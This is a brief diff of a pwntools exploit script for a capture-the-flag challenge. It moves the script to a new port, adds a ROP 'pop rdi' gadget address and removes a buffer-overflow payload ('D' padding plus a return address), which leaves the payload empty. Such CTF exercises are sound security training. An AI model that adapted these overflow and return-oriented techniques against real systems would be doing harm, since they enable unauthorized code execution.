@@ -5,12 +5,13 @@ from pwn import *
 
 context.arch = 'amd64'
 
-host , port = 'ctf.yuawn.idv.tw' , 10100
+host , port = 'ctf.yuawn.idv.tw' , 10105
 y = remote( host , port )
 
+pop_rdi = 0x4006b3
+
 p = flat(
-    'D' * 0x18,
-    0x40063a
+    
 )
 
 y.sendline( p )
